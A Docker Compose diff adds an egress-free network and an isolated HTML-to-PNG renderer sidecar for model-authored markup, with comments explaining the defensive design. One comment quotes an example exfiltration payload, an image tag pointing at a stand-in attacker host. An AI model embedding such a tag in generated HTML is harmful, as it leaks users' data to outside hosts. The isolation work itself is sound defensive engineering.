@@ -189,7 +189,10 @@ services:
     # control server (http://jcode:9100), which lives ONLY on the jcode network — so
     # the api must join it or every /api/jcode/* call 502s (Wave J2). On a stock deploy
     # the network is empty (no jcode profile); the api's jcode client stays fail-closed.
-    networks: [edge, internal, jcode, jlaunch]
+    # `render`: the egress-free network the htmlrender sidecar sits on. The api is its
+    # only caller, and joining an `internal: true` network costs the api nothing — it
+    # keeps its own egress through `edge`/`internal`.
+    networks: [edge, internal, jcode, jlaunch, render]
     depends_on:
       db:
         condition: service_healthy
@@ -696,6 +699,34 @@ services:
       RAPIDOCR_IDLE_TTL_SECONDS: ${RAPIDOCR_IDLE_TTL_SECONDS:-300}
     networks: [internal]
 
+  # General-purpose HTML -> PNG renderer (docs/plans/AGENT_CANVAS_PLAN.md §3b). The canvas
+  # tools are its first caller, not its owner: any tool that wants a flowchart, a table or a
+  # report card renders through here instead of shipping model-authored markup to the PWA,
+  # which DESIGN.md's closed view registry forbids. Rendering to pixels is what makes rich
+  # model-authored HTML safe — the owner's browser receives an image, never live DOM.
+  #
+  # On `render`, which is declared `internal: true` below: this container has NO route off
+  # the box. That is the outer of two locks (server.py aborts every non-data request too),
+  # because the HTML it renders is model-authored and `<img src="http://attacker/?d=...">`
+  # is the obvious exfiltration primitive. It also never receives owner images — callers
+  # render a TRANSPARENT overlay and composite it over the photo inside the firewall.
+  #
+  # Chromium is heavy but idle-unloads after HTMLRENDER_IDLE_TTL_SECONDS, so an idle box
+  # pays only the uvicorn baseline; mem_limit caps a burst. Stock stack (no profile) like
+  # searxng/reader/rapidocr, so a plain `up -d` — what a PWA update runs — brings it up
+  # with no CLI step.
+  htmlrender:
+    image: jbrain2-htmlrender:local
+    build:
+      context: ./src
+      dockerfile: deploy/Dockerfile.htmlrender
+    restart: unless-stopped
+    mem_limit: ${HTMLRENDER_MEM_LIMIT:-1g}
+    shm_size: 1gb  # headless Chromium crashes on the default 64m /dev/shm
+    environment:
+      HTMLRENDER_IDLE_TTL_SECONDS: ${HTMLRENDER_IDLE_TTL_SECONDS:-300}
+    networks: [render]
+
   # OPT-IN MQTT broker (JBrain360 M0 secure spine): Mosquitto + mosquitto-go-auth
   # in HTTP-backend mode, delegating every connect/publish/subscribe to the API's
   # /internal/mqtt-* endpoints (it reuses the shipped device_key model; the plugin
@@ -741,6 +772,13 @@ networks:
   # Isolates the job launcher: only `jlaunch` + `api` join it, so a job's arbitrary code
   # has no route to db/supervisor/worker/embed/blobs.
   jlaunch:
+  # EGRESS-FREE by declaration: `internal: true` means Docker attaches no gateway, so a
+  # container here cannot reach the internet at all — only `htmlrender` + `api` join it.
+  # This is the outer lock on model-authored HTML: the renderer executes untrusted markup,
+  # so the guarantee that a `<img src="http://…">` cannot leave the box is made by the
+  # network topology, not only by the page-level request interception in server.py.
+  render:
+    internal: true
 
 volumes:
   blobs:
